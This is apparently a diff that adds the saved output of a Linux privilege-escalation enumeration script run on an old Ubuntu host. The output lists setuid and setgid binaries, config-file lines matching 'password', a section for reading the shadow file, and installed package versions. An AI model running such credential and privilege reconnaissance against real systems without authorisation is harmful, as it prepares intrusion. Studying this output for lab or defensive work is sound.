+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/nl/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/nl/cat5
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/cat6
+    drwxr-sr-x 5 man root 4096 Sep  2  2012 /var/cache/man/tr
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/tr/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/tr/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/tr/cat5
+    drwxr-sr-x 5 man root 4096 Sep  2  2012 /var/cache/man/pt
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/pt/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/pt/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/pt/cat5
+    drwxr-sr-x 5 man root 4096 Sep  2  2012 /var/cache/man/id
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/id/cat1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/id/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/id/cat5
+    drwxr-sr-x 4 man root 4096 Sep  2  2012 /var/cache/man/fr.ISO8859-1
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/fr.ISO8859-1/cat8
+    drwxr-sr-x 2 man root 4096 Sep  2  2012 /var/cache/man/fr.ISO8859-1/cat7
+    drwx--s--- 2 postfix postdrop 4096 Oct 16 11:51 /var/spool/postfix/public
+    drwxrwsr-x 2 libuuid libuuid 4096 Sep  2  2012 /var/lib/libuuid
+    drwxrwsrwt 2 root whoopsie 4096 Sep  2  2012 /var/crash
+    drwxrwsr-x 2 root mail 4096 Sep  2  2012 /var/mail
+    drwxrwsr-x 7 root staff 4096 Sep  2  2012 /usr/local/share/sgml
+    drwxrwsr-x 2 root staff 4096 Sep  2  2012 /usr/local/share/sgml/dtd
+    drwxrwsr-x 2 root staff 4096 Sep  2  2012 /usr/local/share/sgml/entities
+    drwxrwsr-x 2 root staff 4096 Sep  2  2012 /usr/local/share/sgml/stylesheet
+    drwxrwsr-x 2 root staff 4096 Sep  2  2012 /usr/local/share/sgml/declaration
+    drwxrwsr-x 2 root staff 4096 Sep  2  2012 /usr/local/share/sgml/misc
+    drwxrwsr-x 6 root staff 4096 Sep  2  2012 /usr/local/share/xml
+    drwxrwsr-x 2 root staff 4096 Sep  2  2012 /usr/local/share/xml/entities
+    drwxrwsr-x 2 root staff 4096 Sep  2  2012 /usr/local/share/xml/declaration
+    drwxrwsr-x 2 root staff 4096 Sep  2  2012 /usr/local/share/xml/schema
+    drwxrwsr-x 2 root staff 4096 Sep  2  2012 /usr/local/share/xml/misc
+    drwxrwsr-x 2 root staff 4096 Sep  2  2012 /usr/local/share/ca-certificates
+    drwxrwsr-x 4 root staff 4096 Sep  2  2012 /usr/local/lib/python2.7
+    drwxrwsr-x 2 root staff 4096 Sep  2  2012 /usr/local/lib/python2.7/dist-packages
+    drwxrwsr-x 2 root staff 4096 Sep  2  2012 /usr/local/lib/python2.7/site-packages
+    -rwsr-sr-x 1 libuuid libuuid 17976 Mar 30  2012 /usr/sbin/uuidd
+    -r-xr-sr-x 1 root postdrop 13624 Jul 30  2012 /usr/sbin/postdrop
+    -r-xr-sr-x 1 root postdrop 13608 Jul 30  2012 /usr/sbin/postqueue
+    -rwsr-xr-- 1 root dip 273272 Feb  4  2011 /usr/sbin/pppd
+    -rwsr-xr-x 1 root root 5564 Dec 13  2011 /usr/lib/eject/dmcrypt-get-device
+    -rwsr-xr-- 1 root messagebus 316824 Feb 22  2012 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    -rwsr-xr-x 1 root root 248056 Apr  2  2012 /usr/lib/openssh/ssh-keysign
+    -rwsr-xr-x 1 root root 9728 Apr 20  2012 /usr/lib/pt_chown
+    -rwxr-sr-x 1 root ssh 128416 Apr  2  2012 /usr/bin/ssh-agent
+    -rwxr-sr-x 1 root shadow 18120 Apr  9  2012 /usr/bin/expiry
+    -rwxr-sr-x 3 root mail 9684 Oct 18  2011 /usr/bin/mail-touchlock
+    -rwxr-sr-x 3 root mail 9684 Oct 18  2011 /usr/bin/mail-unlock
+    -rwxr-sr-x 1 root mail 13708 Aug  4  2010 /usr/bin/lockfile
+    -rwsr-xr-x 1 root root 56208 Jul 28  2011 /usr/bin/mtr
+    -rwxr-sr-x 1 root mail 9720 Jan 10  2012 /usr/bin/mutt_dotlock
+    -rwsr-xr-x 2 root root 69708 Jun  1  2012 /usr/bin/sudo
+    -rwsr-xr-x 1 root root 30896 Apr  9  2012 /usr/bin/newgrp
+    -rwsr-xr-x 1 root root 41284 Apr  9  2012 /usr/bin/passwd
+    -rwsr-xr-x 1 root root 40292 Apr  9  2012 /usr/bin/chfn
+    -rwsr-sr-x 1 daemon daemon 42800 Oct 25  2011 /usr/bin/at
+    -rwsr-xr-x 2 root root 69708 Jun  1  2012 /usr/bin/sudoedit
+    -rwxr-sr-x 1 root mail 13932 Oct 17  2011 /usr/bin/dotlockfile
+    -rwxr-sr-x 1 root tty 18036 Mar 30  2012 /usr/bin/wall
+    -rwxr-sr-x 1 root shadow 45284 Apr  9  2012 /usr/bin/chage
+    -rwxr-sr-x 1 root tty 9728 Mar 31  2012 /usr/bin/bsd-write
+    -rwsr-xr-x 1 root root 14012 Nov  8  2011 /usr/bin/traceroute6.iputils
+    -rwxr-sr-x 3 root mail 9684 Oct 18  2011 /usr/bin/mail-lock
+    -rwxr-sr-x 1 root crontab 34776 Jun 19  2012 /usr/bin/crontab
+    -rwsr-xr-x 1 root root 57956 Apr  9  2012 /usr/bin/gpasswd
+    -rwxr-sr-x 1 root utmp 365260 Jun  6  2011 /usr/bin/screen
+    -rwxr-sr-x 1 root mlocate 34432 Aug 17  2011 /usr/bin/mlocate
+    -rwsr-xr-x 1 root root 31748 Apr  9  2012 /usr/bin/chsh
+    -rwsr-sr-x 1 root mail 75600 Aug  4  2010 /usr/bin/procmail
+    -rwsr-xr-x 1 root root 39116 Nov  8  2011 /bin/ping6
+    -rwsr-xr-x 1 root root 88760 Mar 30  2012 /bin/mount
+    -rwsr-xr-x 1 root root 67720 Mar 30  2012 /bin/umount
+    -rwsr-xr-x 1 root root 31116 Apr  9  2012 /bin/su
+    -rwsr-xr-x 1 root root 34740 Nov  8  2011 /bin/ping
+    -rwsr-xr-x 1 root root 26252 Mar  2  2012 /bin/fusermount
+
+[+] Logs containing keyword 'password'
+
+[+] Config files containing keyword 'password'
+    /etc/ssl/openssl.cnf:# input_password = secret
+    /etc/ssl/openssl.cnf:# output_password = secret
+    /etc/ssl/openssl.cnf:challengePassword		= A challenge password
+    /etc/iscsi/iscsid.conf:# To set a CHAP username and password for initiator
+    /etc/iscsi/iscsid.conf:#node.session.auth.password = password
+    /etc/iscsi/iscsid.conf:# To set a CHAP username and password for target(s)
+    /etc/iscsi/iscsid.conf:#node.session.auth.password_in = password_in
+    /etc/iscsi/iscsid.conf:# To set a discovery session CHAP username and password for the initiator
+    /etc/iscsi/iscsid.conf:#discovery.sendtargets.auth.password = password
+    /etc/iscsi/iscsid.conf:# To set a discovery session CHAP username and password for target(s)
+    /etc/iscsi/iscsid.conf:#discovery.sendtargets.auth.password_in = password_in
+    /etc/ltrace.conf:; pwd.h
+    /etc/debconf.conf:# World-readable, and accepts everything but passwords.
+    /etc/debconf.conf:Reject-Type: password
+    /etc/debconf.conf:# Not world readable (the default), and accepts only passwords.
+    /etc/debconf.conf:Name: passwords
+    /etc/debconf.conf:Accept-Type: password
+    /etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
+    /etc/debconf.conf:# databases, one to hold passwords and one for everything else.
+    /etc/debconf.conf:Stack: config, passwords
+    /etc/debconf.conf:# A remote LDAP database. It is also read-only. The password is really
+    /etc/hdparm.conf:# --security-set-pass Set security password
+    /etc/hdparm.conf:# security_pass = password
+    /etc/hdparm.conf:# --user-master Select password to use
+    /etc/dovecot/conf.d/10-auth.conf:# We also try to handle password changes automatically: If user's previous
+    /etc/dovecot/conf.d/10-auth.conf:# TTL for negative hits (user not found, password mismatch).
+    /etc/dovecot/conf.d/10-auth.conf:# Password database is used to verify user's password (and nothing more).
+    /etc/dovecot/conf.d/10-auth.conf:#!include auth-checkpassword.conf.ext
+    /etc/dovecot/conf.d/10-ssl.conf:# If key file is password protected, give the password here. Alternatively
+    /etc/dovecot/conf.d/10-ssl.conf:# root owned 0600 file by using ssl_key_password = <path.
+    /etc/dovecot/conf.d/10-ssl.conf:#ssl_key_password =
+    /etc/dovecot/conf.d/auth-system.conf.ext:# Shadow passwords for system users (NSS, /etc/shadow or similiar).
+    /etc/dovecot/conf.d/10-logging.conf:# In case of password mismatches, log the attempted password. Valid values are
+    /etc/dovecot/conf.d/10-logging.conf:# no, plain and sha1. sha1 can be useful for detecting brute force password
+    /etc/dovecot/conf.d/10-logging.conf:# attempts vs. user simply trying the same password over and over again.
+    /etc/dovecot/conf.d/10-logging.conf:#auth_verbose_passwords = no
+    /etc/dovecot/conf.d/10-logging.conf:# In case of password mismatches, log the passwords and used scheme so the
+    /etc/dovecot/conf.d/10-logging.conf:#auth_debug_passwords = no
+    /etc/dovecot/conf.d/auth-static.conf.ext:# username or the password, or if there is a single password for all users:
+    /etc/dovecot/conf.d/auth-static.conf.ext:#  - proxy frontend, where the backend verifies the password
+    /etc/dovecot/conf.d/auth-static.conf.ext:#  - proxy backend, where the frontend already verified the password
+    /etc/dovecot/conf.d/auth-static.conf.ext:#  args = proxy=y host=%1Mu.example.com nopassword=y
+    /etc/dovecot/conf.d/auth-static.conf.ext:#  args = password=test
+
+[+] Shadow File (Privileged)
+
+[*] ENUMERATING PROCESSES AND APPLICATIONS...
+
+[+] Installed Packages
+    Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
+    Err?=(none)/Reinst-required (Status,Err:
+    Name Version
+    accountsservice 0.6.15-2ubuntu9.3  and manipulate user account information
+    acpid 1:2.0.10-1ubuntu3  Configuration and Power Interface event daemon
+    adduser 3.113ubuntu2  and remove users and groups
+    apparmor 2.7.102-0ubuntu3.1  parser utility for AppArmor
+    apport 2.0.1-0ubuntu12  generate crash reports for debugging
+    apport-symptoms 0.16  scripts for apport
+    apt 0.8.16~exp12ubuntu10.2  package manager
+    apt-transport-https 0.8.16~exp12ubuntu10.2  download transport for APT
+    apt-utils 0.8.16~exp12ubuntu10.2  managment related utility programs
+    apt-xapian-index 0.44ubuntu5  and search tools for a Xapian index of Debian packages
+    aptitude 0.6.6-1ubuntu1  package manager (terminal interface only)
+    at 3.1.13-1ubuntu1  job execution and batch processing
+    base-files 6.5ubuntu6.2  base system miscellaneous files
+    base-passwd 3.5.24  base system master password and group files
+    bash 4.2-2ubuntu2  Bourne Again SHell
+    bash-completion 1:1.3-1ubuntu8  completion for the bash shell
+    bc 1.06.95-2  GNU bc arbitrary precision calculator language
+    bind9-host 1:9.8.1.dfsg.P1-4ubuntu0.2  of 'host' bundled with BIND 9.X
+    bsd-mailx 8.1.2-0.20111106cvs-1  mail user agent
+    bsdmainutils 8.2.3ubuntu1  of more utilities from FreeBSD
+    bsdutils 1:2.20.1-1ubuntu3  utilities from 4.4BSD-Lite
+    busybox-initramfs 1:1.18.5-1ubuntu4  shell setup for initramfs
+    busybox-static 1:1.18.5-1ubuntu4  rescue shell with tons of builtin utilities
+    byobu 5.17-0ubuntu1  text based window manager and shell multiplexer
+    bzip2 1.0.6-1  block-sorting file compressor - utilities
+    ca-certificates 20111211  CA certificates
+    command-not-found 0.2.46ubuntu6  installation of packages in interactive bash sessions
+    command-not-found-data 0.2.46ubuntu6  of data files for command-not-found.
+    console-setup 1.70ubuntu5  font and keymap setup program
+    coreutils 8.13-3ubuntu3  core utilities
+    cpio 2.11-7ubuntu3  cpio -- a program to manage archives of files
+    crda 1.1.2-1ubuntu1  Central Regulatory Domain Agent
+    cron 3.0pl1-120ubuntu4  scheduling daemon
+    curl 7.22.0-3ubuntu4  a file from an HTTP, HTTPS or FTP server
+    dash 0.5.7-2ubuntu2  shell
+    dbus 1.4.18-1ubuntu1  interprocess messaging system (daemon and utilities)
+    debconf 1.5.42ubuntu1  configuration management system
+    debconf-i18n 1.5.42ubuntu1  internationalization support for debconf
+    debianutils 4.2.1ubuntu2  utilities specific to Debian
+    diffutils 1:3.2-1ubuntu1  comparison utilities
+    dmidecode 2.11-4  table decoder
+    dmsetup 2:1.02.48-4ubuntu7.1  Linux Kernel Device Mapper userspace library
+    dnsutils 1:9.8.1.dfsg.P1-4ubuntu0.2  provided with BIND
+    dosfstools 3.0.12-1ubuntu1  for making and checking MS-DOS FAT filesystems
+    dovecot-core 1:2.0.19-0ubuntu2  mail server that supports mbox, maildir, dbox and mdbox mailboxes
+    dovecot-imapd 1:2.0.19-0ubuntu2  IMAP server that supports mbox, maildir, dbox and mdbox mailboxes
+    dovecot-pop3d 1:2.0.19-0ubuntu2  POP3 server that supports mbox, maildir, dbox and mdbox mailboxes
+    dpkg 1.16.1.2ubuntu7  package management system
+    e2fslibs 1.42-1ubuntu2  file system libraries
+    e2fsprogs 1.42-1ubuntu2  file system utilities
+    ed 1.5-3  UNIX line editor
+    eject 2.1.5+deb1+cvs20081104-9  CDs and operates CD-Changers under Linux
+    file 5.09-2  file type using "magic" numbers
+    findutils 4.4.2-4ubuntu1  for finding files--find, xargs
+    finger 0.17-14  information lookup program
+    fingerd 0.17-14  user information server
+    fonts-ubuntu-font-family-console 0.80-0ubuntu2  Font Family Linux console fonts, sans-serif monospace
+    friendly-recovery 0.2.25  recovery more user-friendly
+    ftp 0.17-25  file transfer client
+    fuse 2.8.6-2ubuntu2  in Userspace
+    gcc-4.6-base 4.6.3-1ubuntu5  the GNU Compiler Collection (base package)
+    geoip-database 20111220-1  lookup command line tools that use the GeoIP library (country database)
+    gettext-base 0.18.1.1-5ubuntu3  Internationalization utilities for the base system
+    gir1.2-glib-2.0 1.32.0-1  data for GLib, GObject, Gio and GModule
+    gnupg 1.4.11-3ubuntu2  privacy guard - a free PGP replacement
+    gpgv 1.4.11-3ubuntu2  privacy guard - signature verification tool
+    grep 2.10-1  grep, egrep and fgrep
+    groff-base 1.21-7  troff text-formatting system (base system components)
+    grub-common 1.99-21ubuntu3.1  Unified Bootloader (common files)
+    grub-gfxpayload-lists 0.6  gfxpayload blacklist
+    grub-pc 1.99-21ubuntu3.1  Unified Bootloader, version 2 (PC/BIOS version)
+    grub-pc-bin 1.99-21ubuntu3.1  Unified Bootloader, version 2 (PC/BIOS binaries)
+    grub2-common 1.99-21ubuntu3.1  Unified Bootloader (common files for version 2)
+    gzip 1.4-1ubuntu2  compression utilities
+    hdparm 9.37-0ubuntu3.1  hard disk parameters for high performance
+    hostname 3.06ubuntu1  to set/show the host name or domain name
+    ifupdown 0.7~beta2ubuntu8  level tools to configure network interfaces
+    inetutils-inetd 2:1.8-6  super server
+    info 4.13a.dfsg.1-8ubuntu2  GNU Info documentation browser
+    initramfs-tools 0.99ubuntu13  for generating an initramfs
+    initramfs-tools-bin 0.99ubuntu13  used by initramfs-tools
+    initscripts 2.88dsf-13.10ubuntu11.1  for initializing and shutting down the system
+    insserv 1.14.0-2.1ubuntu2  to organize boot sequence using LSB init.d script dependencies
+    install-info 4.13a.dfsg.1-8ubuntu2  installed documentation in info format
+    installation-report 2.46ubuntu1  installation report
+    iproute 20111117-1ubuntu2  and traffic control tools
+    iptables 1.4.12-1ubuntu4  tools for packet filtering and NAT
+    iputils-ping 3:20101006-1ubuntu1  to test the reachability of network hosts
+    iputils-tracepath 3:20101006-1ubuntu1  to trace the network path to a remote host
+    irqbalance 0.56-1ubuntu4  to balance interrupts for SMP systems
+    isc-dhcp-client 4.1.ESV-R4-0ubuntu5.2  DHCP client
+    isc-dhcp-common 4.1.ESV-R4-0ubuntu5.2  files used by all the isc-dhcp* packages
+    iso-codes 3.31-1  language, territory, currency, script codes and their translations
+    kbd 1.15.2-3ubuntu4  console font and keytable utilities
+    keyboard-configuration 1.70ubuntu5  keyboard preferences
+    klibc-utils 1.5.25-1ubuntu2  utilities built with klibc for early boot
+    krb5-locales 1.10+dfsg~beta1-2ubuntu0.3  support for MIT Kerberos
+    landscape-common 12.05-0ubuntu0.12.04  Landscape administration system client - Common files
+    language-pack-en 1:12.04+20120801  updates for language English
+    language-pack-en-base 1:12.04+20120801  for language English
+    language-selector-common 0.79  selector for Ubuntu
+    laptop-detect 0.13.7ubuntu2  to detect a laptop
+    less 444-1ubuntu1  program similar to more
+    libaccountsservice0 0.6.15-2ubuntu9.3  and manipulate user account information - shared libraries
+    libacl1 2.2.51-5ubuntu1  control list shared library
+    libapt-inst1.4 0.8.16~exp12ubuntu10.2  package format runtime library
+    libapt-pkg4.12 0.8.16~exp12ubuntu10.2  managment runtime library
+    libasn1-8-heimdal 1.6~git20120311.dfsg.1-2  Kerberos - ASN.1 library
+    libattr1 1:2.4.46-5ubuntu1  attribute shared library
+    libbind9-80 1:9.8.1.dfsg.P1-4ubuntu0.2  Shared Library used by BIND
+    libblkid1 2.20.1-1ubuntu3  device id library
+    libboost-iostreams1.46.1 1.46.1-7ubuntu3  Library
+    libbsd0 0.3.0-2  functions from BSD systems - shared library
+    libbz2-1.0 1.0.6-1  block-sorting file compressor library - runtime
+    libc-bin 2.15-0ubuntu10  GNU C Library: Binaries
+    libc6 2.15-0ubuntu10  GNU C Library: Shared libraries
+    libcap-ng0 0.6.6-1ubuntu1  alternate POSIX capabilities library
+    libcap2 1:2.22-1ubuntu3  for getting/setting POSIX.1e capabilities
+    libclass-accessor-perl 0.34-1  module that automatically generates accessors
+    libclass-isa-perl 0.36-3  the search path for a class's ISA tree
+    libcomerr2 1.42-1ubuntu2  error description library
+    libcurl3 7.22.0-3ubuntu4  file transfer library (OpenSSL)
+    libcurl3-gnutls 7.22.0-3ubuntu4  file transfer library (GnuTLS)
+    libcwidget3 0.5.16-3.1ubuntu1  terminal interface library for C++ (runtime files)
+    libdb5.1 5.1.25-11build1  v5.1 Database Libraries [runtime]
+    libdbus-1-3 1.4.18-1ubuntu1  interprocess messaging system (library)
+    libdbus-glib-1-2 0.98-1ubuntu1  interprocess messaging system (GLib-based shared library)
+    libdevmapper-event1.02.1 2:1.02.48-4ubuntu7.1  Linux Kernel Device Mapper userspace library
+    libdevmapper1.02.1 2:1.02.48-4ubuntu7.1  Linux Kernel Device Mapper userspace library
+    libdns81 1:9.8.1.dfsg.P1-4ubuntu0.2  Shared Library used by BIND
+    libdrm-intel1 2.4.32-1ubuntu1  interface to intel-specific kernel DRM services -- runtime
+    libdrm-nouveau1a 2.4.32-1ubuntu1  interface to nouveau-specific kernel DRM services -- runtime
+    libdrm-radeon1 2.4.32-1ubuntu1  interface to radeon-specific kernel DRM services -- runtime
+    libdrm2 2.4.32-1ubuntu1  interface to kernel DRM services -- runtime
+    libedit2 2.11-20080614-3ubuntu2  editline and history libraries
+    libelf1 0.152-1ubuntu3  to read and write ELF files
+    libept1.4.12 1.0.6~exp1ubuntu1  library for managing Debian package information
+    libevent-2.0-5 2.0.16-stable-1  event notification library
+    libexpat1 2.0.1-7.2ubuntu1.1  parsing C library - runtime library
+    libffi6 3.0.11~rc1-5  Function Interface library runtime
+    libfile-copy-recursive-perl 0.38-1  extension for recursively copying files and directories
+    libfreetype6 2.4.8-1ubuntu2  2 font engine, shared library files
+    libfribidi0 0.19.2-1  Implementation of the Unicode BiDi algorithm
+    libfuse2 2.8.6-2ubuntu2  in Userspace (library)
+    libgc1c2 1:7.1-8ubuntu0.12.04.1  garbage collector for C and C++
+    libgcc1 1:4.6.3-1ubuntu5  support library
+    libgcrypt11 1.5.0-3ubuntu0.1  Crypto library - runtime library
+    libgdbm3 1.8.3-10  dbm database routines (runtime version)
+    libgeoip1 1.4.8+dfsg-2  IP-to-country resolver library
+    libgirepository-1.0-1 1.32.0-1  for handling GObject introspection data (runtime library)
+    libglib2.0-0 2.32.3-0ubuntu1  library of C routines
+    libgmp10 2:5.0.2+dfsg-2ubuntu1  arithmetic library
+    libgnutls26 2.12.14-5ubuntu3.1  TLS library - runtime library
+    libgpg-error0 1.10-2ubuntu1  for common error values and messages in GnuPG components
+    libgpgme11 1.2.0-1.4ubuntu2  - GnuPG Made Easy
+    libgpm2 1.20.4-4  Purpose Mouse - shared library
+    libgssapi-krb5-2 1.10+dfsg~beta1-2ubuntu0.3  Kerberos runtime libraries - krb5 GSS-API Mechanism
+    libgssapi3-heimdal 1.6~git20120311.dfsg.1-2  Kerberos - GSSAPI support library
+    libgssglue1 0.3-4  gssapi library
+    libhcrypto4-heimdal 1.6~git20120311.dfsg.1-2  Kerberos - crypto library
+    libheimbase1-heimdal 1.6~git20120311.dfsg.1-2  Kerberos - Base library
+    libheimntlm0-heimdal 1.6~git20120311.dfsg.1-2  Kerberos - NTLM support library
+    libhx509-5-heimdal 1.6~git20120311.dfsg.1-2  Kerberos - X509 support library
+    libidn11 1.23-2  Libidn library, implementation of IETF IDN specifications
+    libio-string-perl 1.08-2  IO::File interface for in-core strings
+    libisc83 1:9.8.1.dfsg.P1-4ubuntu0.2  Shared Library used by BIND
+    libisccc80 1:9.8.1.dfsg.P1-4ubuntu0.2  Channel Library used by BIND
+    libisccfg82 1:9.8.1.dfsg.P1-4ubuntu0.2  File Handling Library used by BIND
+    libiw30 30~pre9-5ubuntu2  tools - library
+    libjs-jquery 1.7.1-1ubuntu1  library for dynamic web applications
+    libk5crypto3 1.10+dfsg~beta1-2ubuntu0.3  Kerberos runtime libraries - Crypto Library
+    libkeyutils1 1.5.2-2  Key Management Utilities (library)
+    libklibc 1.5.25-1ubuntu2  libc subset for use with initramfs
+    libkrb5-26-heimdal 1.6~git20120311.dfsg.1-2  Kerberos - libraries
+    libkrb5-3 1.10+dfsg~beta1-2ubuntu0.3  Kerberos runtime libraries
+    libkrb5support0 1.10+dfsg~beta1-2ubuntu0.3  Kerberos runtime libraries - Support library
+    libldap-2.4-2 2.4.28-1.1ubuntu4.1  libraries
+    liblocale-gettext-perl 1.05-7build1  using libc functions for internationalization in Perl
+    liblockfile-bin 1.09-3  binaries for and cli utilities based on liblockfile
+    liblockfile1 1.09-3  locking library
+    liblwres80 1:9.8.1.dfsg.P1-4ubuntu0.2  Resolver Library used by BIND
+    liblzma5 5.1.1alpha+20110809-3  compression library
+    libmagic1 5.09-2  type determination library using "magic" numbers
+    libmount1 2.20.1-1ubuntu3  device id library
+    libncurses5 5.9-4  libraries for terminal handling
+    libncursesw5 5.9-4  libraries for terminal handling (wide character support)
+    libnewt0.52 0.52.11-2ubuntu10  Erik's Windowing Toolkit - text mode windowing with slang
+    libnfnetlink0 1.0.0-1  netlink library
+    libnfsidmap2 0.25-1ubuntu2  idmapping library
+    libnih-dbus1 1.0.3-4ubuntu9  D-Bus Bindings Library
+    libnih1 1.0.3-4ubuntu9  Utility Library
+    libnl-3-200 3.2.3-2ubuntu2  for dealing with netlink sockets
+    libnl-genl-3-200 3.2.3-2ubuntu2  for dealing with netlink sockets - generic netlink
+    libp11-kit0 0.12-2ubuntu1  for loading and coordinating access to PKCS#11 modules - runtime
+    libpam-modules 1.1.3-7ubuntu2  Authentication Modules for PAM
+    libpam-modules-bin 1.1.3-7ubuntu2  Authentication Modules for PAM - helper binaries
+    libpam-runtime 1.1.3-7ubuntu2  support for the PAM library
+    libpam0g 1.1.3-7ubuntu2  Authentication Modules library
+    libparse-debianchangelog-perl 1.2.0-1ubuntu1  Debian changelogs and output them in other formats
+    libparted0debian1 2.3-8ubuntu5  partition manipulator - shared library
+    libpcap0.8 1.1.1-10  interface for user-level packet capture
+    libpci3 1:3.1.8-2ubuntu5  PCI Utilities (shared library)
+    libpciaccess0 0.12.902-1  PCI access library for X
+    libpcre3 8.12-4  5 Compatible Regular Expression Library - runtime files
+    libpcsclite1 1.7.4-2ubuntu2  to access a smart card using PC/SC (library)
+    libpipeline1 1.2.1-1  manipulation library
+    libplymouth2 0.8.2-2ubuntu30  boot animation and logger - shared libraries
+    libpng12-0 1.2.46-3ubuntu4  library - runtime
+    libpolkit-gobject-1-0 0.104-1ubuntu1  Authorization API
+    libpopt0 1.16-3ubuntu1  for parsing cmdline parameters
+    libpth20 2.0.7-16ubuntu3  GNU Portable Threads
+    libpython2.7 2.7.3-0ubuntu3.1  Python runtime library (version 2.7)
+    libreadline6 6.2-8  readline and history libraries, run-time libraries
+    libroken18-heimdal 1.6~git20120311.dfsg.1-2  Kerberos - roken support library
+    librtmp0 2.4~20110711.gitc28f1bab-1  for RTMP streams (shared library)
+    libsasl2-2 2.1.25.dfsg1-3ubuntu0.1  SASL - authentication abstraction library
+    libsasl2-modules 2.1.25.dfsg1-3ubuntu0.1  SASL - pluggable authentication modules
+    libselinux1 2.1.0-4.1ubuntu1  runtime shared libraries
+    libsigc++-2.0-0c2a 2.2.10-0ubuntu2  Signal Framework for C++ - runtime
+    libslang2 2.2.4-3ubuntu1  programming library - runtime version
+    libsqlite3-0 3.7.9-2ubuntu1.1  3 shared library
+    libss2 1.42-1ubuntu2  interface parsing library
+    libssl1.0.0 1.0.1-4ubuntu5.5  shared libraries
+    libstdc++6 4.6.3-1ubuntu5  Standard C++ Library v3
+    libsub-name-perl 0.05-1build2  for assigning a new name to referenced sub
+    libswitch-perl 2.16-2  statement for Perl
+    libtasn1-3 2.10-1ubuntu1.1  ASN.1 structures (runtime)
+    libtext-charwidth-perl 0.04-7build1  display widths of characters on the terminal
+    libtext-iconv-perl 1.7-5  between character sets in Perl
+    libtext-wrapi18n-perl 0.06-7  substitute of Text::Wrap
+    libtimedate-perl 1.2000-1  of modules to manipulate date/time information
+    libtinfo5 5.9-4  low-level terminfo library for terminal handling
+    libtirpc1 0.2.2-5  RPC library
+    libtokyocabinet8 1.4.37-6.1build1  Cabinet Database Libraries [runtime]
+    libudev0 175-0ubuntu9.1  library
+    libusb-0.1-4 2:0.1.12-20  USB programming library
+    libusb-1.0-0 2:1.0.9~rc3-2ubuntu1  USB programming library
+    libuuid1 2.20.1-1ubuntu3  Unique ID library
+    libwind0-heimdal 1.6~git20120311.dfsg.1-2  Kerberos - stringprep implementation
+    libwrap0 7.6.q-21  Venema's TCP wrappers library
+    libx11-6 2:1.4.99.1-0ubuntu2  client-side library
+    libx11-data 2:1.4.99.1-0ubuntu2  client-side library
+    libxapian22 1.2.8-1  engine library
+    libxau6 1:1.0.6-4  authorisation library
+    libxcb1 1.8.1-1  C Binding
+    libxdmcp6 1:1.1.0-4  Display Manager Control Protocol library
+    libxext6 2:1.3.0-3build1  miscellaneous extension library
+    libxml2 2.7.8.dfsg-5.1ubuntu4.1  XML library
+    libxmuu1 2:1.1.0-3  miscellaneous micro-utility library
+    linux-firmware 1.79  for Linux kernel drivers
+    linux-generic-pae 3.2.0.29.31  Generic Linux kernel
+    linux-image-3.2.0-29-generic-pae 3.2.0-29.46  kernel image for version 3.2.0 on 32 bit x86 SMP
+    linux-image-generic-pae 3.2.0.29.31  Linux kernel image
+    locales 2.13+git20120306-3  files for locale support
+    lockfile-progs 0.1.16  for locking and unlocking files and mailboxes
+    login 1:4.1.4.2+svn3283-3ubuntu5  login tools
+    logrotate 3.7.8-6ubuntu5  rotation utility
+    lsb-base 4.0-0ubuntu20  Standard Base 4.0 init script functionality
+    lsb-release 4.0-0ubuntu20  Standard Base version reporting utility
+    lshw 02.15-2  about hardware configuration
+    lsof 4.81.dfsg.1-1build1  open files
+    ltrace 0.5.3-2.1ubuntu2  runtime library calls in dynamically linked programs
+    lvm2 2.02.66-4ubuntu7.1  Linux Logical Volume Manager
+    makedev 2.3.1-89ubuntu2  device files in /dev
+    man-db 2.6.1-2  manual pager
+    manpages 3.35-0.1ubuntu1  pages about using a GNU/Linux system
+    mawk 1.3.3-17  pattern scanning and text processing language
+    memtest86+ 4.20-1.1ubuntu1  real-mode memory tester
+    mime-support 3.51-1ubuntu1  files 'mime.types' & 'mailcap', and support programs
+    mlocate 0.23.1-1ubuntu2  find files on the filesystem based on their name
+    module-init-tools 3.16-1ubuntu2  for managing Linux kernel modules
+    mount 2.20.1-1ubuntu3  for mounting and manipulating filesystems
+    mountall 2.36  mounting tool
+    mtr-tiny 0.80-1ubuntu1  screen ncurses traceroute tool
+    multiarch-support 2.15-0ubuntu10  package to ensure multiarch compatibility
+    mutt 1.5.21-5ubuntu2  mailreader supporting MIME, GPG, PGP and threading
+    nano 2.2.6-1  friendly text editor inspired by Pico
+    ncurses-base 5.9-4  terminal type definitions
+    ncurses-bin 5.9-4  programs and man pages
+    net-tools 1.60-24.1ubuntu2  NET-3 networking toolkit
+    netbase 4.47ubuntu1  TCP/IP networking system
+    netcat-openbsd 1.89-4ubuntu1  swiss army knife
+    nfs-common 1:1.2.5-3ubuntu3  support files common to client and server
+    nfs-kernel-server 1:1.2.5-3ubuntu3  for NFS kernel server
+    ntfs-3g 1:2012.1.15AR.1-1ubuntu1  NTFS driver for FUSE
+    ntpdate 1:4.2.6.p3+dfsg-1ubuntu3.1  for setting system time from NTP servers
+    openssh-client 1:5.9p1-5ubuntu1  shell (SSH) client, for secure access to remote machines
+    openssh-server 1:5.9p1-5ubuntu1  shell (SSH) server, for secure access from remote machines
+    openssl 1.0.1-4ubuntu5.5  Socket Layer (SSL) binary and related cryptographic tools
+    os-prober 1.51ubuntu3  to detect other OSes on a set of drives
+    parted 2.3-8ubuntu5  partition manipulator
+    passwd 1:4.1.4.2+svn3283-3ubuntu5  and administer password and group data
+    patch 2.6.1-3  a diff file to an original
